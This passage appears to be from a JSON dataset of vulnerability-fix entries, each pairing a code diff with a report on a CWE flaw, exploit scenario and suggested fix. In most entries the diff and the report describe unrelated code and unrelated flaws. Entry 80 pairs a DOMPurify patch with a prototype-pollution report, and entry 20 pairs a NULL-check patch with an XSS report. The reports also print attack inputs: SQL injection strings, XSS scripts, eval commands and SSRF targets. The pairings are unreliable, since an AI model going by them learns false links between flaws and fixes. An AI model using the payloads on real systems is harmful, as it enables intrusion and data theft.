specified on dbf creation, use this\n-default_codepage = 'ascii'\n+default_codepage = system_encoding\n\n ## default format if none specified\n default_type = 'db3'\n```\n\n2. Import and use the configuration values in core library files:\n\ndbf/__init__.py\n```python\ndiff --git a/dbf/__init__.py b/dbf/__init__.py\nindex 3af869b..d150fdc 100644\n--- a/dbf/__init__.py\n+++ b/dbf/__init__.py\n@@ -30,11 +30,14 @@ WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR\n OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF\n ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n \"\"\"\n-version = 0, 99, 11, 1\n # Python 2 code may need to change these\n-default_codepage = None     # will be set by tables module (defaults to ascii)\n-default_type = 'db3'        # lowest common denominator\n-input_decoding = 'ascii'\n+import config\n+\n+version = config.version\n+input_decoding = config.input_decoding\n+default_codepage = config.default_codepage\n+default_type = config.default_type\n+temp_dir = config.temp_dir\n \n # make dbf module importabl internally (i.e. from . import dbf)\n import sys as _sys\n```\n\ndbf/tables.py\n```python\ndiff --git a/dbf/tables.py b/dbf/tables.py\nindex 9947007..ff01da0 100644\n--- a/dbf/tables.py\n+++ b/dbf/tables.py\n@@ -53,7 +53,7 @@ class NullHandler(logging.Handler):\n logger = logging.getLogger('dbf')\n logger.addHandler(NullHandler())\n \n-temp_dir = os.environ.get(\"DBF_TEMP\") or os.environ.get(\"TMP\") or os.environ.get(\"TEMP\") or \"\"\n+temp_dir = dbf.temp_dir\n \n # other constructs\n \n@@ -5451,8 +5451,13 @@ code_pages = {\n         0xf0 : ('utf8', '8-bit unicode'),\n         }\n \n+def _detect_codepage(cp):\n+    for key, value in code_pages.items():\n+        if value[0] == cp:\n+            return key\n+    raise DbfError(\"Unsupported codepage: %s\" % cp)\n \n-dbf.default_codepage = default_codepage =  code_pages.get(0x00)[0]\n+default_codepage = _detect_codepage(dbf.default_codepage)\n \n def _codepage_lookup(cp):\n     if cp not in code_pages:\n```"
    },
    "80": {
        "diff": "--- DashBoard.js\t2025-04-27\n+++ DashBoard_fixed.js\t2025-04-27\n@@\n- $('.js-widget-list').append(data);\n+ $('.js-widget-list').append(DOMPurify.sanitize(data));\n\n- $('.dashboardViewContainer').html(data);\n+ $('.dashboardViewContainer').html(DOMPurify.sanitize(data));\n\n- filteridSelectDOM.empty().html(res).trigger('change');\n+ filteridSelectDOM.empty().html(DOMPurify.sanitize(res)).trigger('change');\n\n- fieldsSelectDOM.empty().html(fieldsHTML).trigger('change');\n+ fieldsSelectDOM.empty().html(DOMPurify.sanitize(fieldsHTML)).trigger('change');\n",
        "explanation": "Vulnerability Type:\nCWE-1287: Improper Neutralization of Input During Data Processing ('Improper Type Validation')\nProof of Concept (Elaborated):\nVulnerable Code: [line 15,16]\nif (req.query.filter != null && isString(req.query.filter)) {\n    req.query.filter = JSON.parse(req.query.filter.replace(/\\+/g, ' '));\n}\nStep-by-Step Explanation:\n1.\tImproper Type Handling:\nOnly checks if req.query.filter is a string (isString(req.query.filter)), but does not validate the contents before attempting JSON.parse.\n2.\tBlind Parsing:\nAttacker can send a crafted payload in filter query param such as:\n3.\tfilter={\"__proto__\":{\"admin\":true}}\nor worse, send invalid/maliciously constructed JSON.\n4.\tConsequences:\no\tPrototype Pollution Attack:\nParsing malicious payloads could allow attackers to modify application behavior at runtime.\no\tServer Crash (DoS):\nIf JSON.parse fails (invalid JSON), and if no global error handler is in place, it can crash the server.\no\tSecurity Bypass:\nMalicious values in filter may bypass logical validations downstream if fields are polluted or corrupted.\nExample Attack:\nRequest:\nGET /rest/stream/documents/find?filter={\"__proto__\":{\"isAdmin\":true}}\nImpact:\n\u2022\tPollutes Object.prototype, potentially giving all objects unexpected properties like isAdmin: true, resulting in privilege escalation.\nSeverity:\nCritical (Prototype Pollution + DoS)\nRoot Cause:\nThe server code trusts that req.query.filter is safe for parsing, performing JSON.parse() directly on it without:\n\u2022\tVerifying its structure\n\u2022\tLimiting its keys\n\u2022\tSafely parsing with input sanitation\nExploit Scenario:\nAn attacker sends a maliciously crafted query parameter like:\n?filter={\"__proto__\":{\"admin\":true}}\nThe unsafe JSON.parse executes, allowing runtime prototype manipulation.\nThis could lead to:\n\u2022\tElevation of privileges\n\u2022\tBroken application logic\n\u2022\tServer-side crashes\n\u2022\tUnexpected permission grants\nWhy It Happens:\nThe vulnerability occurs because only the data type (string) is validated, but the content's safety is not verified before executing JSON.parse().\nBlind trust in input parsing opens up prototype pollution vectors.\n\nSecurity Implications:\nIf exploited:\n\u2022\tServer-wide variable tampering is possible\n\u2022\tPrivilege escalation by injecting admin-like properties\n\u2022\tApplication denial of service (DoS) by crashing JSON parsing logic\n\u2022\tInconsistent behavior due to prototype overrides\n\nSuggested Fix:\n--- streamApi.ts\t2025-04-27\n+++ streamApi_fixed.ts\t2025-04-27\n@@\n-import isString from 'lodash/isString';\n+import isString from 'lodash/isString';\n+import secureParse from 'secure-json-parse'; // new safe parser\n\n if (req.query.filter != null && isString(req.query.filter)) {\n-    req.query.filter = JSON.parse(req.query.filter.replace(/\\+/g, ' '));\n+    try {\n+        req.query.filter = secureParse.safeParse(req.query.filter.replace(/\\+/g, ' '));\n+        if (!req.query.filter || typeof req.query.filter !== 'object') {\n+            throw new Error('Invalid filter format');\n+        }\n+    } catch (error) {\n+        reply.code(400).send({ error: 'Invalid filter JSON structure' });\n+        return;\n+    }\n }\n\n"
    },
    "74": {
        "diff": "diff --git a/client/src/server.js b/client/src/server.js\nnew file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ b/client/src/server.js\n@@ -0,0 +1,50 @@\n+'use strict';\n+const express      = require('express');\n+const http         = require('http');\n+const io           = require('socket.io');\n+const cors         = require('cors');\n+const csurf        = require('csurf');\n+const cookieParser = require('cookie-parser');\n+\n+const FETCH_INTERVAL = 5000;\n+const PORT           = process.env.PORT || 4000;\n+\n+const tickers = [\n+  'AAPL', 'GOOGL', 'MSFT', 'AMZN', 'FB', 'TSLA'\n+];\n+\n+const app = express();\n+app.use(cors());\n+app.use(cookieParser());\n+app.use(express.urlencoded({ extended: true }));\n+app.use(csurf({ cookie: true }));\n+\n+const server = http.createServer(app);\n+const socketServer = io(server, {\n+  cors: { origin: \"*\" }\n+});\n+\n+// Middleware para obtener y enviar el token CSRF\n+app.get('/csrf-token', (req, res) => {\n+  res.json({ csrfToken: req.csrfToken() });\n+});\n+\n+// Endpoint protegido contra CSRF\n+app.post('/secure-action', (req, res) => {\n+  res.json({ message: \"Acci\u00f3n realizada con protecci\u00f3n CSRF.\" });\n+});\n+\n+app.get('/', (req, res) => {\n+  res.sendFile(__dirname + '/index.html');\n+});\n+\n+socketServer.on('connection', (socket) => {\n+  socket.on('start', () => {\n+    trackTickers(socket);\n+  });\n+});\n+\n+server.listen(PORT, () => {\n+  console.log(`Streaming service is running on http://localhost:${PORT}`);\n+});\n",
        "explanation": "Vulnerability Type:\nCWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n\nSeverity:\nHigh\n\nRoot Cause:\nIn the TPOTBase class, there are two instances where the eval() function is used directly on dynamic input without proper validation or sanitization. Specifically, at line 529 (`self.operators_context[var] = eval(var)`) and line 1422 (`sklearn_pipeline = eval(sklearn_pipeline_str, self.operators_context)`), user-controllable strings are evaluated as Python code. This introduces a critical risk because if an attacker can influence these variables, they can execute arbitrary code within the running process.\n\nProof of Concept:\nAn attacker could inject malicious input into the variables that are passed to eval(). For example:\n```python\nvar = \"__import__('os').system('echo hacked')\"\neval(var)\n```\nThis would execute the 'echo hacked' command on the system. Similarly, for the pipeline string:\n```python\nsklearn_pipeline_str = \"__import__('os').system('id')\"\neval(sklearn_pipeline_str, self.operators_context)\n```\nThis would execute the 'id' command, confirming code execution on the server. Both examples show how arbitrary commands can be injected and executed.\n\nExploit Scenario:\nAn attacker could modify a configuration file or input to inject malicious Python code into the operator imports or pipeline structure. When TPOTBase attempts to parse these fields using eval(), it would unknowingly execute the malicious payload. The attacker could then achieve goals such as executing shell commands, stealing sensitive files, opening backdoors, or disabling security measures \u2014 fully compromising the system.\n\nWhy It Happens:\nThis vulnerability arises because the code assumes the dynamic content being evaluated is always safe, without implementing restrictions or input validation. Using eval() directly on external or untrusted input violates fundamental secure coding practices, making it easy for attackers to inject arbitrary code.\n\nSecurity Implications:\nSuccessful exploitation can lead to full system compromise. Potential impacts include execution of arbitrary operating system commands, unauthorized access to sensitive information, destruction of data, persistence of malware, and elevation of privileges. This could affect the confidentiality, integrity, and availability of critical systems or data, resulting in catastrophic organizational impacts.\n\nSuggested Fix:\nAvoid the use of eval() entirely for dynamic content. Instead:\n- Replace unsafe `eval(var)` with `getattr(importlib.import_module(module), var)`.\n- Replace unsafe evaluation of pipeline strings with `compile()` followed by `eval()` in a restricted environment where `__builtins__` are disabled.\n- Validate and strictly control any dynamic content before execution.\n- Use safe parsing methods like ast.literal_eval() for simple data structures when applicable.\nThese changes prevent code injection, ensure only intended operations occur, and greatly reduce the attack surface.\n\n\n"
    },
    "73": {
        "diff": "var WebSocket = require('..'),\n    deflate   = require('permessage-deflate'),\n    fs        = require('fs'),\n    http      = require('http'),\n    https     = require('https'),\n    path      = require('path'); // Add path module for security\n\nvar port    = process.argv[2] || 7000,\n    secure  = process.argv[3] === 'tls',\n    options = {extensions: [deflate], ping: 5};\n\nvar upgradeHandler = function(request, socket, head) {\n  var ws = new WebSocket(request, socket, head, ['irc', 'xmpp'], options);\n  console.log('[open]', ws.url, ws.version, ws.protocol, request.headers);\n\n  ws.pipe(ws);\n\n  ws.onclose = function(event) {\n    console.log('[close]', event.code, event.reason);\n    ws = null;\n  };\n};\n\nvar requestHandler = function(request, response) {\n  if (!WebSocket.EventSource.isEventSource(request))\n    return staticHandler(request, response);\n\n  var es   = new WebSocket.EventSource(request, response),\n      time = parseInt(es.lastEventId, 10) || 0;\n\n  console.log('[open]', es.url, es.lastEventId);\n\n  var loop = setInterval(function() {\n    time += 1;\n    es.send('Time: ' + time);\n    setTimeout(function() {\n      if (es) es.send('Update!!', {event: 'update', id: time});\n    }, 1000);\n  }, 2000);\n\n  fs.createReadStream(__dirname + '/haproxy.conf').pipe(es, {end: false});\n\n  es.onclose = function() {\n    clearInterval(loop);\n    console.log('[close]', es.url);\n    es = null;\n  };\n};\n\nvar staticHandler = function(request, response) {\n  const safeBase = path.resolve(__dirname); // Set safe base directory\n  const requestedPath = path.normalize(path.join(safeBase, request.url));\n\n  // Prevent path traversal: ensure requestedPath starts with safeBase\n  if (!requestedPath.startsWith(safeBase)) {\n    response.writeHead(400, {'Content-Type': 'text/plain'});\n    response.end('Invalid path');\n    return;\n  }\n\n  fs.readFile(requestedPath, function(err, content) {\n    var status = err ? 404 : 200;\n    response.writeHead(status, {'Content-Type': 'text/html'});\n    response.write(content || 'Not found');\n    response.end();\n  });\n};\n\nvar server = secure\n           ? https.createServer({\n               key:  fs.readFileSync(__dirname + '/../spec/server.key'),\n               cert: fs.readFileSync(__dirname + '/../spec/server.crt')\n             })\n           : http.createServer();\n\nserver.on('request', requestHandler);\nserver.on('upgrade', upgradeHandler);\nserver.listen(port);",
        "explanation": "Vulnerability Type:\nCWE-352: Cross-Site Request Forgery (CSRF)\n\nProof of Concept:\nThe following code snippet handles incoming requests without implementing any CSRF protection middleware:\n\njavascript\nCopy\nEdit\napp.get('/', function(req, res) {\n  res.sendFile(__dirname + '/index.html');\n});\nSince there is no CSRF protection such as using the csurf middleware, an attacker can craft malicious requests that the user's browser unknowingly executes while authenticated.\nThere is no verification to ensure that the request originates from a trusted source.\n\nSeverity:\nHIGH\n\nRoot Cause:\nThe Express application does not integrate CSRF protection mechanisms like csurf. This omission leads the server to blindly trust any incoming request without confirming its origin or legitimacy. Without requiring security tokens or validating headers like Origin or Referer, the server becomes vulnerable to cross-site request forgery attacks where unauthorized actions can be performed on behalf of legitimate users.\n\nExploit Scenario:\nAn attacker can lure a logged-in user into visiting a malicious page that automatically sends crafted HTTP requests (GET or POST) to the vulnerable server. Since no CSRF protection is in place, the server processes these requests under the user\u2019s authenticated session, allowing the attacker to perform unauthorized actions like modifying account information, submitting fraudulent stock orders, or stealing user data.\n\nWhy It Happens:\nThis vulnerability occurs because the server accepts user requests without verifying whether they are intentional or originated from a trusted source. Developers often mistakenly assume that using HTTPS or session-based authentication alone is sufficient. However, without explicitly validating requests via CSRF tokens, the server cannot distinguish legitimate interactions from maliciously induced ones, creating a serious security gap that attackers can easily exploit.\n\nSecurity Implications:\nIf exploited, attackers could force authenticated users to perform unintended actions on the server, such as transferring money, updating account settings, or even deleting accounts. This could lead to severe breaches of confidentiality, integrity, and availability of user data and actions, ultimately resulting in reputational damage, financial loss, and compromised trust in the application.\n\nSuggested Fix:\nTo resolve this vulnerability, integrate CSRF protection middleware like csurf into the Express application. Use it to generate a CSRF token for each user session and validate the token on every sensitive request. The token should be sent to the client via a cookie or form field and must be included in subsequent requests. Enforcing CSRF token validation helps confirm that requests originate from legitimate, user-initiated actions, thereby mitigating CSRF risks effectively.\n\n"
    },
    "87": {
        "diff": "---\n School_Management_System.py | 25 +++++++++++++++++++++++++\n 1 file changed, 25 insertions(+)\n\ndiff --git a/School_Management_System.py b/School_Management_System.py\nindex abcdef0..1234567 100644\n--- a/School_Management_System.py\n+++ b/School_Management_System.py\n@@ def add_record():\n     name = name_strvar.get()\n     email = email_strvar.get()\n     contact = contact_strvar.get()\n     gender = gender_strvar.get()\n     DOB = dob.get_date()\n     stream = stream_strvar.get()\n\n+    # Step 1: Check if any field is empty\n     if not name or not email or not contact or not gender or not DOB or not stream:\n         mb.showerror('Error!', \"Please fill all the missing fields!!\")\n         return\n\n+    # Step 2: Regex Email Validation\n+    import re\n+    email_pattern = r\"[^@]+@[^@]+\\.[^@]+\"\n+    if not re.match(email_pattern, email):\n+        mb.showerror('Invalid Email', 'Please enter a valid email address.')\n+        return\n+\n+    # Step 3: Contact Number Validation\n+    if not contact.isdigit() or len(contact) != 10:\n+        mb.showerror('Invalid Contact', 'Phone number must be exactly 10 digits.')\n+        return\n+\n+    # Step 4: Name Validation\n+    if not re.match(\"^[A-Za-z ]+$\", name):\n+        mb.showerror('Invalid Name', 'Name should only contain letters and spaces.')\n+        return\n\n     try:\n         connector.execute(\n             'INSERT INTO SCHOOL_MANAGEMENT (NAME, EMAIL, PHONE_NO, GENDER, DOB, STREAM) VALUES (?,?,?,?,?,?)',\n             (name, email, contact, gender, DOB, stream)\n         )\n         connector.commit()\n         mb.showinfo('Record added', f\"Record of {name} was successfully added\")\n         reset_fields()\n         display_records()\n-    except:\n-        mb.showerror('Wrong type', 'The type of the values entered is not accurate. Pls note that the contact field can only contain numbers')\n+    except sqlite3.Error as e:\n+        mb.showerror('Database Error', f'Database error: {e}')\n--\n2.25.1",
        "explanation": "Bug Report: Authentication Bypass via Client-Side State Manipulation \nVulnerability Type: Broken Authentication / Auth Bypass  \nSeverity: High  \nCVSS v3.1 Score:8.2 (Privilege Escalation, Unauthorized Access)  \nPath: \n`https://github.com/NiazMorshed2007/project-management/blob/master/src/routes/PrivateRoutes.jsx`\n\n---\n\nExplanation\n\n---\n\nRoot Cause:\nThe application relies solely on client-side state management (`Redux` store\u2019s `isLogged` flag) to determine if a user is authenticated.  \nThere is no server-side verification of authentication tokens (such as Firebase ID tokens or JWTs) during route access control.\n\nBecause the authentication check is based on easily modifiable local variables, attackers can manipulate the state (via DevTools or scripts) to gain unauthorized access to protected routes.\n\n---\n\nExploit Scenario:\nAn attacker opens browser DevTools and manually sets the Redux `isLogged` flag to `true`:\n\n```javascript\nstore.dispatch({ type: \"LOGIN_SUCCESS\" });\n```\nor modifies localStorage/sessionStorage (if stored there).\n\nAs a result:\n- The application thinks the attacker is authenticated.\n- Private pages and functionalities become accessible without valid login credentials.\n\n---\n\nWhy It Happens:\nThe system trusts client-side logic for authentication, without any server/token verification or session validation.  \nClient-side state alone should never be the single source of truth for authentication status.\n\n---\n\nSecurity Implications:\n- Unauthorized Data Access: Private user data, projects, organizations may be accessed.\n- Privilege Escalation: An attacker could gain elevated access depending on frontend routes.\n- Business Logic Abuse: Unauthorized creation, deletion, or modification of entities.\n- Data Breach Risks: Sensitive information may be exfiltrated.\n---\n\nSuggested Fix:\n\n- Mandatory Server-Side Token Validation:\n  - After login, the app must validate tokens like Firebase ID tokens or JWTs with backend APIs.\n  - On each page load or action, verify session validity before allowing access.\n  \n\n  - Instead of relying only on Redux, use Firebase `onAuthStateChanged` listeners or server-side session checks.\n\n- Implement Expiry and Refresh Mechanisms: \n  - Auth tokens must expire and be refreshed securely.\n\n- Use HttpOnly Cookies for Auth Tokens:  \n  - Reduce the chance of client-side token theft (e.g., XSS).\n\n- CSP (Content Security Policy) Enforcement:\n  - Prevent script injection attacks that could modify client state.\n\nExample Secure Route Check:\n```javascript\nimport { onAuthStateChanged } from \"firebase/auth\";\n\nonAuthStateChanged(auth, (user) => {\n  if (!user) {\n    // Redirect to login\n  } else {\n    // Proceed\n  }\n});\n```\nor call backend `/validate-session` API to check token status.\n\n---\n"
    },
    "27": {
        "diff": "diff --git a/src/controllers/uploads.js b/src/controllers/uploads.js\nindex e11d72b..b21aa43 100644\n--- a/src/controllers/uploads.js\n+++ b/src/controllers/uploads.js\n@@ const isImage = uploadedFile.type.match(/image./);\n+ const fileType = await FileType.fromFile(uploadedFile.path);\n+ const allowedMimeTypes = [\n+   'image/jpeg',\n+   'image/png',\n+   'image/gif',\n+   'image/webp',\n+ ];\n+\n+ if (!fileType || !allowedMimeTypes.includes(fileType.mime)) {\n+   throw new Error('[[error:invalid-mime-type]]');\n+ }\n\n@@ if (allowed.length > 0 && (!extension || extension === '.' || !allowed.includes(extension))) {\n-\tthrow new Error(`[[error:invalid-file-type, ${allowed.join('&#44; ')}]]`);\n+\tthrow new Error('[[error:invalid-file-type]]');\n }\n\n@@ const isSVG = uploadedFile.type === 'image/svg+xml';\n+ if (fileType.mime === 'image/svg+xml') {\n+   throw new Error('[[error:svg-upload-not-allowed]]');\n+ }\n",
        "explanation": "Vulnerability Type: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection').\n\nProof of Concept:\n\napp.get('/user', (req, res) => {\n  const username = req.query.username;\n  db.query(`SELECT * FROM users WHERE username = '${username}'`, (err, result) => {\n    if (err) throw err;\n    res.send(result);\n  });\n});\nIn the above code, user input is concatenated directly into an SQL query. If a user provides input like ' OR '1'='1, it turns the query into:\n\nsql\nCopy\nEdit\nSELECT * FROM users WHERE username = '' OR '1'='1'\nThis allows attackers to retrieve all records, bypassing the intended logic.\n\nSeverity: 5/5 \u2013 Critical. This vulnerability may allow full database compromise and unauthorized access.\n\nRoot Cause: The code dynamically builds SQL queries using user input without sanitization or parameterization. This allows the input to break query structure and inject malicious SQL, leading to unintended execution.\n\nExploit Scenario: An attacker crafts a URL like /user?username=' OR '1'='1' which manipulates the SQL query logic to bypass filters, exposing all records or sensitive information.\n\nWhy It Happens: This occurs because the application includes raw user input directly into the SQL query string, rather than using safe methods like parameterized queries. This is a fundamental security design flaw.\n\nSecurity Implications: If exploited, this can lead to complete data leakage, authentication bypass, unauthorized data manipulation, or even full control of the database depending on permissions.\n\nSuggested Fix: Replace string concatenation with parameterized queries. For example:\n\njavascript\nCopy\nEdit\ndb.query(\"SELECT * FROM users WHERE username = ?\", [username])\nInput should also be validated and sanitized, and the database user should have only limited privileges.\n\nAffected Pages -\n1)  Asset-Tracker/connection.php\n    \u276f\u2771 temp.sqli-taint-user-input\n          Possible SQL Injection vulnerability via user input in variable 'email'\n}\n \nif ($password == $pswrepeat) {\n    $password = md5($password);\n    $query = \"INSERT INTO user (fname, lname, phone, email, password) VALUES ('$fname','$lname','$phone','$email','$password')\";\n    mysqli_query($conn,$query);\n    $_SESSION['message'] = \"You Are Now Registered\";\n    // $_SESSION['email'] = $email;\n    header(\"location: login.php\");"
    },
    "18": {
        "diff": "diff --git a/backbone.js b/backbone.js\nindex abcdef1..1234567 100644\n--- a/backbone.js\n+++ b/backbone.js\n@@ -4320,6 +4320,20 @@\n       if (!this._hasPushState && !this.atRoot()) {\n         var rootPath = this.root.slice(0, -1) || '/';\n         var redirectUrl = rootPath + '#' + this.getPath();\n+\n+        // Open Redirect Mitigation: Ensure the redirect URL is same-origin\n+        function isSafeRedirect(url) {\n+          try {\n+            var parsedUrl = new URL(url, window.location.origin);\n+            return parsedUrl.origin === window.location.origin;\n+          } catch (e) {\n+            return false;\n+          }\n+        }\n+\n+        if (isSafeRedirect(redirectUrl)) {\n+          this.location.assign(redirectUrl);\n+        } else {\n+          console.warn(\"Blocked unsafe redirect attempt:\", redirectUrl);\n+        }\n        \n       }\n",
        "explanation": "Clear Description [Refer Report in the ZIP File for a Clear Understanding]\nVulnerability Type:\nCWE-918: Server-Side Request Forgery (SSRF)\n\nProof of Concept:\nThe Proof of Concept is that these lines are directly fetching external/internal resources based on unvalidated or partially controlled input\n\nSteps to Reproduce:\n1.   Navigate to the https://github.com/codelitdev/courselit\n2.   Go to https://github.com/codelitdev/courselit/blob/main/apps/web/middleware.ts\n3.   These lines are directly fetching external/internal resources based on unvalidated or partially controlled input:\n\u2022\tbackend is derived from request headers using getBackendAddress, which might be manipulable.\n\u2022\tresp.logo is a user-controllable field from the response of a previous fetch.\nIf an attacker can manipulate these inputs (via headers or upstream data), they can cause the server to make arbitrary requests to internal services.\n\nconst response = await fetch(`${backend}/verify-domain`);\n...\nconst response = await fetch(resp.logo);\n  \n4.   No validation is done on the backend or resp.logo before making outbound requests.\n5.   External URLs (even potentially internal ones like http://localhost, http://169.254.169.254) can be passed and accessed by the server.\n\n\n\nSeverity:\nHigh\nAccording to standard CVSS criteria, SSRF vulnerabilities are High severity, especially when they allow access to internal services or metadata endpoints.\n\nRoot Cause:\nUnvalidated input from the request headers and untrusted JSON response data (resp.logo) is used directly to make server-side HTTP requests, allowing attackers to forge requests to potentially internal or sensitive systems.\n\nExploit Scenario:\nAn attacker could manipulate request headers to point getBackendAddress to an internal IP like http://localhost:8000 or the AWS metadata IP http://169.254.169.254, tricking the server into fetching resources that should not be externally accessible.\nSimilarly, if resp.logo is controlled via the backend, an attacker could return a malicious domain (like http://malicious.site/steal), forcing the server to fetch from there.\n\nWhy It Happens:\nThis happens because of a lack of input sanitization and validation. The application assumes the values used in fetch() (like backend and resp.logo) are safe and trustworthy, without checking for malicious or internal URLs.\n\nSecurity Implications:\n\u2022\tAccess to internal APIs or metadata services (like AWS/GCP instance metadata).\n\u2022\tPossible data exfiltration, unauthorized access, or privilege escalation.\n\u2022\tCould serve as a pivot point for lateral movement inside cloud infrastructure.\n\u2022\tOpens up the server to DoS via slow-loris style endpoints or large responses.\n\nSuggested Fix:\n\u2022\tValidate URLs before making outbound requests. Only allow fetches to a pre-approved allowlist of domains/IPs.\n\u2022\tDisallow private IP ranges (127.0.0.1, 169.254.169.254, etc.) explicitly using regex or a DNS resolution check.\n\u2022\tSanitize and parse user-controllable values with URL parsers to ensure safety.\n\u2022\tUse a proxy server to sanitize and gate all outbound requests from the application.\nPatch Code:\ndiff --git a/middleware.ts b/middleware.ts\nindex abc1234..def5678 100644\n--- a/middleware.ts\n+++ b/middleware.ts\n@@\n import { NextResponse, type NextRequest } from \"next/server\";\n import NextAuth from \"next-auth\";\n import { authConfig } from \"./auth.config\";\n import { getBackendAddress } from \"@/lib/get-backend-address\";\n+\n+function isSafeUrl(url: string): boolean {\n+    try {\n+        const parsed = new URL(url);\n+        const disallowedHosts = [\"localhost\", \"127.0.0.1\", \"169.254.169.254\"];\n+        if (disallowedHosts.includes(parsed.hostname)) return false;\n+        return true;\n+    } catch {\n+        return false;\n+    }\n+}\n\n const { auth } = NextAuth(authConfig);\n\n export default auth(async (request: NextRequest) => {\n     const requestHeaders = request.headers;\n-    const backend = getBackendAddress(requestHeaders);\n+    const backend = getBackendAddress(requestHeaders);\n+\n+    if (!isSafeUrl(`${backend}/verify-domain`)) {\n+        return Response.json({ success: false, error: \"Unsafe backend URL\" }, { status: 400 });\n+    }\n\n     if (request.nextUrl.pathname === \"/healthy\") {\n         return Response.json({ success: true });\n     }\n\n     try {\n         const response = await fetch(`${backend}/verify-domain`);\n\n         if (!response.ok) {\n             throw new Error();\n         }\n\n         const resp = await response.json();\n\n         requestHeaders.set(\"domain\", resp.domain);\n\n         if (request.nextUrl.pathname === \"/favicon.ico\") {\n             try {\n-                if (resp.logo) {\n-                    const response = await fetch(resp.logo);\n-                    if (response.ok) {\n-                        const blob = await response.blob();\n-                        return new NextResponse(blob, {\n-                            headers: {\n-                                \"content-type\": \"image/webp\",\n-                            },\n-                        });\n-                    } else {\n-                        return NextResponse.rewrite(\n-                            new URL(`/default-favicon.ico`, request.url),\n-                        );\n-                    }\n-                } else {\n-                    return NextResponse.rewrite(\n-                        new URL(`/default-favicon.ico`, request.url),\n-                    );\n-                }\n+                if (resp.logo && isSafeUrl(resp.logo)) {\n+                    const logoResp = await fetch(resp.logo);\n+                    if (logoResp.ok) {\n+                        const blob = await logoResp.blob();\n+                        return new NextResponse(blob, {\n+                            headers: {\n+                                \"content-type\": \"image/webp\",\n+                            },\n+                        });\n+                    }\n+                }\n+                return NextResponse.rewrite(\n+                    new URL(`/default-favicon.ico`, request.url),\n+                );\n             } catch (err) {\n                 return NextResponse.rewrite(\n                     new URL(`/default-favicon.ico`, request.url),\n                 );\n             }\n         }\n\n         return NextResponse.next({\n             request: {\n                 headers: requestHeaders,\n             },\n         });\n     } catch (err) {\n         return Response.json(\n             { success: false, error: err.message },\n             { status: 404 },\n         );\n     }\n });\n\n export const config = {\n     matcher: [\"/\", \"/favicon.ico\", \"/api/:path*\", \"/healthy\"],\n     unstable_allowDynamic: [\"/node_modules/next-auth/**\"],\n };\n\n"
    },
    "20": {
        "diff": "--- vulnerable_xpath_eval.c\n+++ vulnerable_xpath_eval.c\n@@ void vulnerable_xpath_eval(xmlDocPtr doc, xmlNodePtr node) {\n-    ctxt = xmlXPathNewContext(doc);\n-    ctxt->node = node; // Potential NULL dereference if ctxt == NULL\n+    ctxt = xmlXPathNewContext(doc);\n+    if (ctxt == NULL) {\n+        // Handle allocation failure safely\n+        return;\n+    }\n+    ctxt->node = node;\n}",
        "explanation": "[Refer ZIP File For Detailed Report]\nVulnerability Type: \nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nProof of Concept:\nparams.to_unsafe_h.deep_merge({q: {shipment_state_eq: :shipped, shipment_state_not_in: '', state_eq: '', state_in: '', refunded: '', partially_refunded: ''}})\nThis line directly incorporates user-controlled parameters (params.to_unsafe_h) into HTML without sanitization or escaping. If an attacker includes malicious JavaScript in a parameter, such as:\n?q[shipment_state_eq]=<script>alert(1)</script>\nand the view renders this input, the script could execute in the victim's browser.\nSolution:\nUse strong parameter filtering and avoid rendering raw parameter values directly in views. Escape all user inputs using h() or ensure Rails' default output escaping is preserved.\n\nSeverity:\nHigh \u2014 Since XSS can lead to session hijacking, CSRF, and data theft.\n\nRoot Cause:\nThe code merges unfiltered, potentially unsafe user parameters (params.to_unsafe_h) directly into a hash used for rendering UI elements, without sanitization or encoding.\n\nExploit Scenario:\nAn attacker sends a specially crafted URL to a user with a malicious parameter like:\n?q[shipment_state_eq]=<script>stealCookies()</script>\nIf the page renders this value back to the browser, the script executes in the context of the application.\n\nWhy It Happens:\nRails\u2019 to_unsafe_h bypasses strong parameter filtering, and when merged into hashes used for rendering, malicious data can be embedded directly in the HTML output without proper encoding.\n\nSecurity Implications:\nAn attacker can execute JavaScript in the context of an authenticated user, leading to theft of session tokens, user impersonation, or redirection to malicious websites.\n\nSuggested Fix:\nAvoid using to_unsafe_h unless necessary. Prefer params.permit(...) to whitelist only safe keys and values. Always ensure values rendered in views are HTML-escaped or sanitized.\nparams.permit(q: [:shipment_state_eq, :shipment_state_not_in, :state_eq, :state_in, :refunded, :partially_refunded]).to_h.deep_merge(...)\n\n"
    },
    "16": {
        "diff": "--- a/index.js\n+++ b/index.js\n@@\n+// Default error handler\n+app.use((err, req, res, next) => {\n+    console.error(err.stack);\n+    res.status(500).send('Something went wrong!');\n+});\n",
        "explanation": "Vulnerability Type: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nProof of Concept:\n\nFile: https://github.com/roy9495/Food-App/blob/main/src/Pages/Recipe.jsx\n\nVulnerable Code Snippet:\nLine 46: <h3 dangerouslySetInnerHTML={{ __html: details.summary }}></h3>\nLine 47: <h3 dangerouslySetInnerHTML={{ __html: details.instructions }}></h3>\n\n- The app fetches untrusted HTML content (`summary`, `instructions`) from an external API (`api.spoonacular.com`).\n- The fetched data is inserted into the DOM without sanitization.\n- If the API response contains malicious HTML, like `<img src=x onerror=\"alert('XSS')\">`, it will be directly executed in the user's browser.\n- The attacker does not need any authentication \u2014 just the ability to inject content into the API (or a man-in-the-middle can alter responses).\n\n\nSeverity: High (4) - High risk due to remote exploitability, potential for full session hijacking, and direct script execution.\n\n\nRoot Cause: The vulnerability is caused by rendering external, untrusted HTML data into the DOM using `dangerouslySetInnerHTML` without validating or sanitizing it first. This unsafe insertion point allows attackers to inject malicious scripts that execute inside the browser context.\n\n\nExploit Scenario: An attacker injects a crafted recipe into the external API containing malicious HTML like `<script>alert(document.cookie)</script>`. When a user views that recipe in the app, the malicious script automatically executes, stealing cookies or sensitive data.\n\n\nWhy It Happens: The system directly trusts and inserts HTML from an external API into the DOM without applying any sanitization or validation. `dangerouslySetInnerHTML` bypasses React\u2019s internal protections against XSS, making it critical to sanitize inputs manually.\n\n\nSecurity Implications: If exploited, an attacker could perform actions like stealing authentication tokens, hijacking user sessions, modifying page content, defacing the site, or executing actions on behalf of the user without 